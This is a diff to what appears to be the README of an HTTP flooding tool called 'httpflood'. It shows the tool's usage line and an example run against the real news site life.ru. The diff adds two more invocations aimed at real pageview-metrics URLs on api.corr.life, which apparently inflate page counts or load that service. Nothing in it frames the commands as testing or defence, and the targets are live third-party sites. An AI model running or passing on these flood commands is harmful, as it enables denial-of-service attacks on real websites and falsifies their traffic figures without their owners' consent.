@@ -49,3 +49,5 @@ Or anything else of http header. If you don't have any idea of this please just 
     ./httpflood  <url> <threads> <get/post> <seconds> <header.txt/nil>
 
     ./httpflood  https://life.ru/ 5 get 30 nil
+    ./httpflood  "https://api.corr.life/public/metrics/pageview/site?url=/p/1474721" 1 get 5 nil
+    ./httpflood  "https://api.corr.life/public/metrics/pageview/site?url=/p/1475336" 1 get 5 nil
